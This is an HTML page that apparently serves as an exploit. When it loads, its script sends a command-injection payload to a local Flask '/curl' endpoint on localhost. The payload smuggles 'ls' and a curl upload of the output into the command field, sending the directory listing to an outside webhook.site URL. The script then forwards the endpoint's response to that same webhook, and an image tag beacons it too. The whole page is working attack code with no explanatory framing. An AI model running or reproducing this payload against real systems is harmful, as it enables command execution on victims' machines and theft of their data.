<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Auto Forward Response</title>
</head>
<body>
    <img src='https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2'>
<script>
(async () => {
    try {
        // 1. Send request to local Flask curl endpoint
        const res = await fetch("http://localhost:8001/curl", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "cmd=https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2;%20ls>ls.txt;%20curl%20-X%20POST%20--data-binary%20@ls.txt%20https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2" // replace with the command you want//; ls>ls.txt; curl -X POST --data-binary @ls.txt https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2
        });
        const data = await res.text();

        // 2. Forward response to your webhook
        await fetch("https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2", {
            method: "POST",
            headers: { "Content-Type": "text/plain" },
            body: data
        });

        console.log("Response forwarded successfully!");
    } catch (err) {
        console.error(err);
    }
})();
</script>
</body>
</html>
